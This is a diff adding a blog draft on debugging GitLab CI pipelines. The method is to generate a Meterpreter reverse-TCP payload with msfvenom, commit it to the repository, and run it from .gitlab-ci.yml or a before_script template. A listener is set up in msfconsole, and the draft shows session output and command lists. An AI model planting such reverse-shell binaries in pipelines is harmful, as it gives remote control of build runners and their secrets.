@@ -1,0 +1,259 @@
+#+title: Debug Gitlab With Metasploit
+#+Date: 2023-07-28
+#+Draft: true
+#+Tags[]: devops gitlab-ci gitlab metasploit
+#+PROPERTY: header-args :eval never-export
+
+More often than not I see people struggling with troubleshooting their
+pipelines, and more often than not the chosen way of debugging such pipelines is
+trial and error. There is a better solution for this which is more elegant and
+effective.
+
+By injecting code in between the commands which one wishes to troubleshoot, and
+then having a full environment access along with the tools required to perform
+tests and analysis is the ideal scenario. Considering the requirements:
+
+  - Not always you can connect to the runner instance directly, so the runner
+    has to connect to your server.
+  - Runners can be executed inside a cluster (Kubernetes, Docker Swarm, AWS ECS,
+    etc...), the tool and connection method must accommodate for it.
+  - The injected binary must have the minimum amount of dependencies possible,
+    so no further setup is required.
+  - The binary must include tooling to facilitate the troubleshooting process,
+    such as tools for downloading, uploading and manipulating files,
+    troubleshooting network connections and connectivity issues and handling
+    processes.
+
+This is a concept which can be reused on other CI/CD tools, such as Github
+Actions, Travis and Jenkins.
+
+** Meterpreter
+Meterpreter is a powerful and versatile post-exploitation tool widely used in
+the field of cybersecurity. Developed as part of the Metasploit Framework,
+Meterpreter is designed to provide remote access and control over compromised
+systems, allowing penetration testers and security professionals to interact
+with target machines seamlessly.
+
+Meterpreter fulfill all our requirements, it operates using several connection
+methods, including reverse connection, can be generated for not having any
+dependencies and includes a good set of tooling which we can leverage to debug
+CI/CD pipelines.
+
+* Generate a Meterpreter payload
+Once Metasploit is installed, simply run:
+
+#+begin_src bash
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > meterpreter.elf
+#+end_src
+
+To facilitate the process, on systems with a few network cards, is common for
+the first one to be a =loopback= interface, the bash function below get the first
+IP address after the =loopback= interface:
+
+#+begin_src bash
+function msfvenom-linux-meterpreter-default() {
+    local LHOST="${1:-$(ip addr show | grep -o "inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" | head -2 | tail -1)}"
+    local LPORT="${2:-4444}"
+    echo "[+] Creating a reverse connect meterpreter payload for ${LHOST}:${LPORT}"
+    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf > meterpreter.elf
+    echo "[+] Result saved to meterpreter.elf"
+}
+#+end_src
+
+Nothing more than this is required to create a Meterpreter binary. If you run
+the function =msfvenom-linux-meterpreter-default= without any parameter, the first
+network interface after =loopback= will be used, or you can specify as the first
+parameter, the IP address which the meterpreter payload will use. The second
+parameter is the port to which it will connect to, the default is =4444= in case
+no port is set.
+
+We can easily check if the resulting binary is statically linked:
+
+#+begin_src bash :results verbatim
+ldd ../../meterprefer.elf
+#+end_src
+
+#+RESULTS:
+: 	statically linked
+
+Other networking aspects should also be taken into consideration, in case you
+are behind a firewall, opening the respective ports and configuring the proper
+forward is required. If you are using =Nixos= you will need to setup your local
+firewall as such:
+
+#+begin_src nix
+networking.firewall = {
+  enable = true;
+  allowedTCPPorts = [ 4444 ];
+};
+#+end_src
+
+** Serving the binary
+There are three main ways in which the binary can be injected into the CI/CD
+pipeline:
+- Add it directly to the git, commit and push it.
+- Encode it with base64 and inject it into the pipeline definition, and during
+  runtime convert it to a binary.
+- Serve it over the network and download it as a step on the pipeline.
+
+For the sake of simplicity, we will follow up with adding it to the repository
+as a binary file.
+
+* Executing
+Before moving forward with the pipeline, the next step is to setup Metasploit
+and listen for the connection from the binary. Start =msfconsole= on your platform
+and use the following commands, adjust them based on the arguments used when
+creating the binary:
+
+#+begin_src
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter_reverse_tcp
+PAYLOAD => linux/x64/meterpreter_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.15.22
+LHOST => 192.168.15.22
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > set ExitOnSession false
+ExitOnSession => false
+msf6 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) >
+[*] Started reverse TCP handler on 192.168.15.22:4444
+#+end_src
+
+* Gitlab runner job definition
+For the exemplification of this technique, a simple pipeline like the one below
+can be used to attest the functionality and capabilities described on this
+document. Add the following file to your repository, commit and push it.
+
+#+begin_src yaml
+stages:
+  - "run"
+
+Run:
+  stage: run
+  tags:
+    - shell
+  script:
+    - chmod +x meterpreter.elf
+    - ./meterpreter.elf
+#+end_src
+
+If =CI/CD= is not being shown on the left menu, select =Settings > General=, on this
+page expand =Visibility, project features, permissions=, in the =Repository=
+section, turn on =CI/CD=, select Save changes. On real pipelines you may be
+interested in using =before_script= to execute the injected binary:
+
+#+begin_src yaml
+.start_debug_session:
+  before_script:
+    - chmod +x meterpreter.elf
+    - ./meterpreter.elf
+
+my_failing_job:
+  extends: .start_debug_session
+  script:
+    - pytest
+
+#+end_src
+
+* Shell
+After puting all the pieces together and triggering the pipeline, you should be
+presented with similar messages on your Metasploit terminal.
+
+#+begin_example
+[*] Meterpreter session 1 opened (192.168.15.22:4444 -> 192.168.15.22:33800) at 2023-07-28 23:46:41 +0200
+
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter x64/linux  rafael @ localhost  192.168.15.22:4444 -> 192.168.15.22:33800 (192.16
+                                                            8.15.22)
+#+end_example
+
+You can use =sessions -i= to interact with a connection, and =Ctrl+Z= to stop
+interacting with it without killing it. Once the connection is in place, you
+have a full shell, along with a lot of other useful commands which you can use
+to debug your pipelines:
+
+#+begin_example
+meterpreter > ls
+Listing: /var/lib/private/gitlab-runner/builds/s5L862kM/0/rafael/test-debug-gitlab
+===============================================================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+040755/rwxr-xr-x  86       dir   2023-07-29 02:26:42 +0200  .git
+100644/rw-r--r--  130      fil   2023-07-29 02:26:41 +0200  .gitlab-ci.yml
+100644/rw-r--r--  6225     fil   2023-07-29 02:25:31 +0200  README.md
+100755/rwxr-xr-x  1038520  fil   2023-07-29 02:26:15 +0200  meterpreter.elf
+#+end_example
+
+** System commands
+#+begin_example
+Command       Description
+-------       -----------
+execute       Execute a command
+getenv        Get one or more environment variable values
+getpid        Get the current process identifier
+getuid        Get the user that the server is running as
+kill          Terminate a process
+localtime     Displays the target system local date and time
+pgrep         Filter processes by name
+pkill         Terminate processes by name
+ps            List running processes
+shell         Drop into a system command shell
+suspend       Suspends or resumes a list of processes
+sysinfo       Gets information about the remote system, such as OS
+#+end_example
+** File commands
+#+begin_example
+Command       Description
+-------       -----------
+cat           Read the contents of a file to the screen
+cd            Change directory
+checksum      Retrieve the checksum of a file
+chmod         Change the permissions of a file
+cp            Copy source to destination
+del           Delete the specified file
+dir           List files (alias for ls)
+download      Download a file or directory
+edit          Edit a file
+getlwd        Print local working directory
+getwd         Print working directory
+lcat          Read the contents of a local file to the screen
+lcd           Change local working directory
+lls           List local files
+lpwd          Print local working directory
+ls            List files
+mkdir         Make directory
+mv            Move source to destination
+pwd           Print working directory
+rm            Delete the specified file
+rmdir         Remove directory
+search        Search for files
+upload        Upload a file or directory
+#+end_example
+** Networking commands
+
+#+begin_example
+Command       Description
+-------       -----------
+arp           Display the host ARP cache
+getproxy      Display the current proxy configuration
+ifconfig      Display interfaces
+ipconfig      Display interfaces
+netstat       Display the network connections
+portfwd       Forward a local port to a remote service
+resolve       Resolve a set of host names on the target
+route         View and modify the routing table
+#+end_example
+
+* References
+- [[https://docs.gitlab.com/ee/ci/yaml/][Gitlab CI reference]]
